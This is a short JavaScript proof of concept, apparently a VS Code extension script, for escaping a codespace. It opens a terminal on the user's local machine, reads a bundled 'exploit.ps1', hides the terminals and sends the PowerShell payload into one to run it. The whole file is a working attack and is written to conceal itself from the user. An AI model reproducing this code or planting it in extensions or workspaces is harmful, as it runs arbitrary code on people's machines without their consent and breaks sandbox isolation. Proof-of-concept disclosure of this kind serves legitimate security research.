const vscode = require('vscode');
const fs = require('fs');

(async () => {
  // Open a terminal on the local machine (which allows us to escape the codespace)
  vscode.commands.executeCommand('workbench.action.terminal.newLocal');
  const workspaceFolders = vscode.workspace.workspaceFolders;
  const workspaceRoot = workspaceFolders[0].uri;
  
  // PoC only handle windows but logic for other operating system would go here
  // Let's load the powershell exploit
  const windowsExploitPath = vscode.Uri.joinPath(workspaceRoot,'exploit.ps1');
  const winExploit = (await vscode.workspace.fs.readFile(windowsExploitPath)).toString();
  
  // Execute the exploit
  const intervalId = setInterval(()=> {
    const terminals = vscode.window.terminals;
    for (let i = 0; i < terminals.length; i++) {
      const terminal = terminals[i];
      terminal.hide();
      if (terminal.name.includes('powershell')) {
        terminal.sendText(winExploit, true);
        clearInterval(intervalId);
      }
    }

  }, 50);
})();
